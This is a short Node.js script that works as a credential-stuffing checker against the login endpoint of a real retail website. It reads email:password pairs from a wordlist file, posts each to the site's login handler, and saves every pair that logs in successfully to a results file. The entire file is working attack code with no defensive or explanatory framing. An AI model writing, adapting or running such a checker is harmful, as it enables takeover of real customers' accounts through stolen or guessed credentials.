const fetch = require("node-fetch");
const fs = require("async-file");
const fset = require("fs");

const searchParams = (objectJson) => {
    return Object.keys(objectJson).map((key) => {
        return encodeURIComponent(key) + '=' + encodeURIComponent(objectJson[key]);
    }).join('&');
};

async function login(email, password) {
    try {

        let json = {
            name: 'login',
            email: email,
            password: password,
        };

        let body = searchParams(json);

        let response = await fetch('https://mobilecity.vn/load-ajax/', {
            method: 'POST',
            body: body,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length': new Buffer(body).length
            }
        });
        let data = await response.json();
        return data;
    } catch (error) {
        console.log(error);
    }
}

async function done(data) {
    fset.open('./done.txt', 'a', 755, function( e, id ) {
        fset.write(id, data + "\r\n", null, 'utf8', function () {
            fset.close(id, function () {
                console.log('Done: '+data);
            });
        });
    })
}

(async () => {
    try {
        let file = await fs.readFile('./wordlist.txt', { encoding: 'utf8' });
        let splitByLine = file.split(/\r?\n/);

        for (let i = 0; i < splitByLine.length; i++) {
            const data = splitByLine[i];
            let user = data.split(":");
            let doLogin = await login(user[0], user[1]);

            if (doLogin.status == 1) {
                await done(user[0]+':'+user[1]);
            }
        }

    } catch (error) {
        console.log('error: ', error);
    }
})();
